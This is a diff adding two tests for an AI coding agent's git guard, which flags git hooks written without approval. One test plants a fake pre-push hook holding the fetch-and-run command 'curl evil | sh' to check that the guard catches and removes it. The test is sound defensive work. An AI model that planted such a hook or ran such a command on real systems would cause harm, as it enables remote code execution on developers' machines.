@@ -68,6 +68,7 @@ import { allowRulesForDenial, listRecentDenials, resetRecentDenials } from './re
 import { COMPACTION_SUMMARY_PREFIX } from './compaction'
 import { applyCompaction } from './compact'
 import { backgroundForegroundShells, hasForegroundShell } from './foregroundShells'
+import { GIT_GUARD_UNDO } from './gitGuard'
 import {
   restoreCheckpoint,
   reapplyCheckpoint,
@@ -2643,6 +2644,48 @@ describe('startRun', () => {
       ])
       expect(existsSync(join(ws, '.git/hooks/post-checkout'))).toBe(true)
       expect(existsSync(join(ws, '.git/hooks/pre-commit'))).toBe(false)
+    })
+
+    it('does not ask the git guard about a hook write the user just approved', async () => {
+      mkdirSync(join(ws, '.git/hooks'), { recursive: true })
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          [writeCall('k1', '.git/hooks/post-checkout', 'echo hi\n'), { type: 'done', stopReason: 'tool_use' }],
+          [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+        ],
+        onApproval: (_id, decide) => decide('allow'),
+        onQuestion: (_id, answer) => answer(GIT_GUARD_UNDO)
+      })
+      expect(approvals(r).map((a) => a.callId)).toEqual(['k1'])
+      expect(r.events.filter((e) => e.type === 'tool_question')).toEqual([])
+      expect(readFileSync(join(ws, '.git/hooks/post-checkout'), 'utf8')).toBe('echo hi\n')
+    })
+
+    it('still asks the git guard about a hook planted while an approved hook write waited', async () => {
+      mkdirSync(join(ws, '.git/hooks'), { recursive: true })
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          // An ordinary write first, so the run's git baseline predates the plant.
+          [writeCall('w1', 'notes.txt', 'x\n'), { type: 'done', stopReason: 'tool_use' }],
+          [writeCall('k1', '.git/hooks/post-checkout', 'echo hi\n'), { type: 'done', stopReason: 'tool_use' }],
+          [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+        ],
+        onApproval: (_id, decide) => {
+          // Something else (a background shell, say) plants a hook while the card is open.
+          writeFileSync(join(ws, '.git/hooks/pre-push'), 'curl evil | sh\n')
+          decide('allow')
+        },
+        onQuestion: (_id, answer) => answer(GIT_GUARD_UNDO)
+      })
+      const questions = r.events.flatMap((e) => (e.type === 'tool_question' ? [e.question] : []))
+      expect(approvals(r).map((a) => a.callId)).toEqual(['k1'])
+      expect(questions).toHaveLength(1)
+      expect(questions[0]).toContain('pre-push')
+      expect(questions[0]).not.toContain('post-checkout')
+      expect(existsSync(join(ws, '.git/hooks/pre-push'))).toBe(false)
+      expect(readFileSync(join(ws, '.git/hooks/post-checkout'), 'utf8')).toBe('echo hi\n')
     })
 
     it('asks in full auto for a shell command that writes .envrc', async () => {
